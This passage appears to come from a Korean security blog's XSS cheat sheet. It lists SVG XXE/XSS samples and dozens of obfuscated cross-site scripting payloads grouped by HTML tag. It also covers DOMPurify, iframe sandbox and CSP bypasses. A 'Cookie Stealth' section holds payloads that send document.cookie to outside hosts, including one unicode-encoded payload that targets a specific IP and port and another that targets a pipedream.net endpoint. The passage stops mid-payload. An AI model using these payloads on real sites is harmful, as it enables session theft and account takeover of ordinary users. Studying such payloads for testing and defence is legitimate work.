class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&quot;XXE &amp; XSS&quot;</span>);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; Open Redirect</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">  <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.location=&#x27;URL&#x27;&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.rog/200/svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload<br></h2><p><span style="color:#21C587">&#35;</span><strong> Reflection XSS statement</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">script tag</span><br><span class="line"><span class="tag">&lt;<span class="name">scrit</span>&gt;</span>void&#x27;&#x27;??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert(1)<span class="tag">&lt;/<span class="name">scipt</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoMSk=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">img tag</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window.alert(1)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window[</span>&#x27;<span class="attr">eva</span>&#x27;+&#x27;<span class="attr">l</span>&#x27;](<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">alert,_(/xss/)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">&#x27;e&#x27;</span>+&#x27;<span class="attr">val</span>&#x27;,<span class="attr">_</span>(<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"></span><br><span class="line">svg tag</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\50\61\51&#x27;)&gt;</span><br><span class="line">&lt;svg/onload=&#x27;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#x27;&gt;</span><br><span class="line">  </span><br><span class="line">details tag</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top.alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>&#x27;<span class="attr">prompt</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">YWxlcnQoMSk</span>=<span class="string">&#x27;)) &gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=eval(&#x27;</span>\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span> &gt;</span></span><br><span class="line">  </span><br><span class="line">iframe tag</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&#x27;<span class="attr">pt:aler</span>&#x27;,&#x27;<span class="attr">t</span>(<span class="attr">1</span>)&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&#x27;<span class="attr">java</span>&#x27;,&#x27;<span class="attr">script:</span>&#x27;,&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">body tag</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;body/onfocus=alert(1)&gt;</span><br><span class="line">&lt;body/onload=alert(1)&gt;</span><br><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">input tag</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onbeforecopy</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;input/autofocus/onfocus=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</span><br><span class="line">  </span><br><span class="line">a tag</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">name</span>=<span class="string">xss</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">ondragend</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:&#x27;\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76&#x27;&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">video tag</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onkeypress</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">button tag</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ondblclick</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onkeyup</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">object tag</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">&#x27;text/x-scriptlet&#x27;</span> <span class="attr">data</span>=<span class="string">&#x27;http://example.com/xss.html&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">  xss.html -&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">embed tag</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">audio tag</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">textarea tag</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">meter tag</span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">select tag</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">form tag</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Cookie Stealth</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">fetch(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(<span class="keyword">new</span> Image).src=<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.get(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.getScript(<span class="string">&quot;//domain&quot;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:document.location=&#x27;url&#x27;%2bdocument.cookie&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&quot;<span class="attr">pt:document</span>&quot;,&quot;<span class="attr">.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&quot;<span class="attr">java</span>&quot;,&quot;<span class="attr">script:</span>&quot;,&quot;<span class="attr">document.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0034\u0031\u002e\u0031\u0036\u0034\u002e\u0035\u0032\u002e\u0032\u0030\u0037\u003a\u0031\u0032\u0033\u0034\u0035\u002f\u003f\u0061\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065&quot;)&gt;</span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;//384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net?&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="DOMPurify-Bypass"><a href="#DOMPurify-Bypass" class="headerlink" title="DOMPurify Bypass"></a>DOMPurify Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;path id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="Iframe-Sandbox-Bypass"><a href="#Iframe-Sandbox-Bypass" class="headerlink" title=" Iframe Sandbox Bypass"></a><span style="color:#21C587"></span> Iframe Sandbox Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>iframe sandbox bypass<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;xss payoad&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;exploit()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;pocas&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://domain/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass<br></h2><p><span style="color:#21C587">&#35;</span><strong> Use an accepted domain</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; http:&#x2F;&#x2F;141.164.52.207</span><br></pre></td></tr></table></figure><p><strong>위와 같이 나 자신과 특정(<a href="http://141.164.52.207/">http://141.164.52.207</a>) 도메인에서 오는 스크립트는 실행이 가능한 경우, 해당 서버에 파일(xss poc)을 업로드하고, poc 코드를 불러오면 위와 같은 CSP를 우회할 수 있습니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong> Header Injection</strong><br></p><p><strong>만약 헤더 인젝션이 가능하다고 가정하에 응답 코드를 102와 같은 것들로 수정하면 브라우저는 CSP를 해석하지 않아 우회가 가능합니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong> AngularJS xss</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; script-src &#39;self&#39; cdnjs.cloudflare.com;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;url&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>만약 위와 같이 <code>cdnjs.cloudflare.com</code>와 같이 AngularJS를 가져와서 사용할 수 있을 경우 AngularJS XSS를 이용하면 CSP를 우회할 수 있고, 예시 페이로드는 위와 같습니다.</strong><br></p><p><span style="color:#21C587">&#35;</span><strong> CSP Option ↔ Bypass</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: </span><br><span class="line">default-src &#x27;self&#x27; data: *; connect-src &#x27;self&#x27;; script-src  &#x27;self&#x27; ;</span><br><span class="line">report-uri /_csp; upgrade-insecure-requests</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;&lt;script 